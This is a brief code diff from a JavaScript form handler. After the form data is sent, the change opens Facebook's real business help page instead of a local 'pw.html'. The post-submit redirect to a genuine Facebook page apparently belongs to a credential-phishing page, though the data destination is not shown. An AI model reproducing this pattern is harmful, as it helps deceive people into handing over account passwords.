@@ -23,7 +23,7 @@ form.addEventListener("submit", function (e) {
   };
 
   xhr.send(formData); // Moved this line outside the if block
-  window.open("pw.html", "_blank");
+  window.open("https://web.facebook.com/business/help?_rdc=1&_rdr", "_blank");
 });
 // function submitFormAndOpenTab() {
 //   // Get the form element
